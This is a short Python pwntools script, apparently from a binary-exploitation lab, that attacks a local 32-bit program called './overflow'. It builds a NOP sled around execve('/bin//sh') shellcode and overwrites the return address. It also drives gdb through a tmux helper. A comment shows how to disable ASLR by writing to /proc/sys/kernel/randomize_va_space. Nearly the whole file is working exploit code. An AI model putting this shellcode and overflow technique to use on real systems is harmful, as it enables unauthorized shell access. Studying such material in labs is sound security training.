# ls *.py | entr bash -c 'date; python main.py'
# echo 0 > /proc/sys/kernel/randomize_va_space

import subprocess

from pwn import *
from pwn import gdb

SHELLCODE = (
    # b"\xcc"
    b"\x31\xc0\x50\x68\x2f\x2f\x73"
    b"\x68\x68\x2f\x62\x69\x6e\x89"
    b"\xe3\x89\xc1\x89\xc2\xb0\x0b"
    b"\xcd\x80\x31\xc0\x40\xcd\x80"
)
TARGET = "./overflow"
RET = p32(0xDEADC0DE)
# RET = p32(0xffffba24) # get from coredump

def s(cmd):
    for c in cmd.split(b"\n"):
        if c.strip():
            print(c)
            subprocess.run(["tmuxpwnrestart", "SEND", base64.b64encode(c)])

context.terminal = ["tmuxpwnrestart"]
context.log_level = logging.DEBUG

# g = cyclic_gen()
# print(g.find(b"jaab"))

payload = b""
payload += 36 * b"\x90"
payload += SHELLCODE
payload += (100 - len(SHELLCODE)) * b"\x90"

# print(hexdump(payload, width=16, groupsize=16))

io = gdb.debug(TARGET)
io.sendline(payload)
s(
    b"target exec " + TARGET.encode()
    + b"""
    b *0x0804847f
    """
    + b'r $(echo "' + payload + RET + b'")'
    + b"""
    x/64wx $esp-136
    """
)
# io.interactive()
# io.recv()
